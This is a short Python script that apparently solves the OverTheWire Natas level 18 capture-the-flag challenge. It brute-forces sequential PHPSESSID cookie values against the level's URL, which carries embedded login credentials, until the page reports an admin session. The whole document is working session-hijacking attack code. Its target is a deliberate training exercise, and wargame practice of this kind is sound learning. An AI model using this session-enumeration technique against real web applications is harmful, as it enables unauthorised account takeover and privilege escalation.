import requests

target = 'http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/'
acceptStr = "You are an admin."

r = requests.get(target)
if r.status_code != requests.codes.ok:
        print("cant connect")
        exit()
else:
        print('Target reachable. Starting session brute force...')

for i in range(1,641):
        if i % 10 == 0:
                print( 'Checked '+str(i)+' sessions...')
        cookies = {"PHPSESSID":str(i)}
        r = requests.get(target, cookies=cookies)
        if  acceptStr in str(r.content):
                print ('Got it! Session='+str(i))
                print (r.content)
                break
